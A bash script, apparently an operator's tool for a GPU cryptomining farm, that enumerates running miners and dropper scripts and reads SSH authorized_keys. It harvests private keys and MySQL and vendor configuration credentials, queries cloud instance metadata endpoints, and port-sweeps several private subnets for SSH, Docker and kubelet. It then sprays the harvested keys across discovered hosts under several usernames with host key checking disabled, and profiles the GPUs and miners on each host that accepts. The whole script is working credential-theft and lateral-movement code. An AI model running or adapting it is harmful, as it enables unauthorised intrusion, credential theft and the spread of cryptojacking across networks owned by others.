#!/bin/bash
# farmfanout2: real miner identification + full 192.168.0.0/24 recheck + IMDS + cred harvest + extended key ladder
set +e
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
D=/root/ul_farmfan; mkdir -p $D
log(){ echo "$@"; }
log "### START2 $(date -u +%FT%TZ)"; hostname
log "### COMPUTE-APPS"; nvidia-smi --query-compute-apps=pid,gpu_uuid,process_name,used_memory --format=csv 2>&1
log "### PS-TOP"; ps aux --sort=-%cpu 2>/dev/null | head -22 | cut -c1-220
log "### PS-FULL"; ps -eo pid,ppid,user,etimes,args 2>/dev/null | grep -viE 'grep|ps -eo' | head -70 | cut -c1-240
log "### PROC-EXE"; ls -l /proc/[0-9]*/exe 2>/dev/null | grep -E 'wildrig|krig|peak|srb|miner|\.u/|nv-cache' | head -20
log "### UNIT-PLH"; systemctl cat plh-card@.service 2>&1 | head -40
log "### UNIT-NVC"; systemctl cat nv-cuda-cache.service 2>&1 | head -25
log "### DROPPERS"
for f in /dev/shm/.u/sample.sh /usr/local/lib/nv-cache/g.sh /opt/t19/krig_dl.sh /root/ul/*.sh /opt/t19/*.sh; do [ -f "$f" ] && { log "===== $f"; head -50 "$f"; }; done
log "### LS"; ls -la /opt/t19 /opt/t19/krig /root/ul /opt/arsenal/miners 2>&1 | head -70
log "### AUTHKEYS"; cut -c1-140 /root/.ssh/authorized_keys 2>/dev/null
log "### PRIVKEYS"; find / -xdev -type f \( -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' -o -name '*.pem' -o -name 'id_dsa' \) 2>/dev/null | grep -vE '^/proc|/usr/share' | head -25
log "### DATAAPPS"; ls -la /data/apps 2>&1 | head -25; ls -la /data/apps/conf 2>&1 | head -15; sed -n '1,150p' /data/apps/conf/hosts 2>&1
log "### VENDORS"; ls -la /ssd/vendors/QD_GLAD/npa_bicm 2>&1 | head -20; find /ssd/vendors -maxdepth 4 -type f \( -name '*.cnf' -o -name 'my.ini' -o -name '*.env' -o -name 'config.php' \) 2>/dev/null | head -20
log "### MYSQLCONF"; grep -rniE 'password|user' /etc/mysql/debian.cnf /etc/mysql/my.cnf /etc/mysql/mysql.conf.d/*.cnf 2>/dev/null | head -20
log "### IMDS"
for u in "http://169.254.169.254/latest/meta-data/instance-id" "http://169.254.169.254/latest/meta-data/" "http://169.254.169.254/instance_identity/v1/token" "http://100.100.100.200/latest/meta-data/" "http://169.254.169.254/openstack/latest/meta_data.json" "http://metadata.google.internal/computeMetadata/v1/"; do
  log "-- $u"; timeout 5 curl -s -m 4 "$u" 2>&1 | head -c 220; echo
done
log "### SWEEP2"
python3 - <<'PY'
import socket,concurrent.futures
tasks=[]
for s in ["192.168.0","192.168.1","192.168.2","10.100.80"]:
    for i in range(1,255):
        for p in (22,9400,2375,10250):
            tasks.append((f"{s}.{i}",p))
def chk(a):
    h,p=a
    try:
        s=socket.create_connection((h,p),1.2); s.close(); return a
    except Exception: return None
res=[]
with concurrent.futures.ThreadPoolExecutor(500) as ex:
    for r in ex.map(chk,tasks):
        if r: res.append(r); print("OPEN",r[0],r[1],flush=True)
open('/root/ul_farmfan/open2.txt','w').write("\n".join(f"{h} {p}" for h,p in res)+"\n")
PY
log "### ROUTE-CHECK"
for h in 10.242.32.6 10.102.2.161 10.251.10.107 10.80.80.12 172.16.21.2 10.100.80.5 49.235.160.237; do
  log "-- $h"; timeout 3 ping -c1 -W1 $h 2>&1 | tail -1; timeout 3 bash -c "cat </dev/null >/dev/tcp/$h/22" 2>/dev/null && log "OPEN22 $h" || log "NO22 $h"
done
cat > /tmp/ap2.sh <<'EOA'
#!/bin/sh
printf '%s\n' "$ULPT"
EOA
chmod +x /tmp/ap2.sh
log "### LADDER2"
: > $D/accept2.txt
KEYS=$(find / -xdev -type f \( -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' \) 2>/dev/null | grep -vE '^/proc|/usr/share' | head -6)
log "KEYSET2: $KEYS"
awk '$2==22{print $1}' $D/open2.txt | sort -u | grep -vE '^(11\.9\.141\.|192\.168\.1\.1$|192\.168\.2\.1$)' > $D/targets2.txt
head -40 $D/targets2.txt
n=0
while read -r h; do
  [ -z "$h" ] && continue
  case "$h" in 192.168.0.23|11.9.141.*) continue;; esac
  n=$((n+1)); [ $n -gt 30 ] && { log "CAP30"; break; }
  ok=0
  for k in $KEYS; do
    for u in root ubuntu kgzs para; do
      out=$(timeout 10 ssh -n -i "$k" -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 "$u@$h" 'echo OK; id -u; hostname' 2>&1); rc=$?
      if [ $rc -eq 0 ]; then echo "ACCEPT2 $h $u $k" | tee -a $D/accept2.txt; log " HIT $u@$h key=$(basename $k)"; ok=1; break 2; fi
      grep -qiE 'Permission denied' <<<"$out" || log "  $u@$h key=$(basename $k) rc=$rc $(head -c 100 <<<"$out" | tr '\n' ' ')"
      sleep 0.4
    done
  done
  [ $ok -eq 0 ] && log "NOAUTH $h"
done < $D/targets2.txt
log "### ACCEPT2"; cat $D/accept2.txt
log "### BASELINE2"
while IFS=' ' read -r tag h u k; do
  [ "$tag" != ACCEPT2 ] && continue
  log "--- base $h"
  timeout 40 ssh -n -i "$k" -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 "$u@$h" 'echo HOST=$(hostname); id -u; nvidia-smi -L 2>&1|head -9; echo DEV=$(ls /dev/nvidia[0-9]* 2>/dev/null|wc -l); nvidia-smi --query-gpu=index,name,memory.total,utilization.gpu --format=csv,noheader 2>&1|head -9; nvidia-smi --query-compute-apps=pid,process_name,used_memory --format=csv 2>&1|head -10; ps -eo args 2>/dev/null|grep -Ei "krig|wildrig|peak|srb"|grep -v grep|cut -c1-200|head -4; systemctl list-units --type=service --no-pager 2>/dev/null|grep -iE "plh|krig|prl|mine"|head -6; crontab -l 2>/dev/null|grep -iE "shm|nv-cache|krig|prl"' 2>&1 | tee -a $D/base2.txt
done < $D/accept2.txt
log "### DONE2 $(date -u +%FT%TZ)"
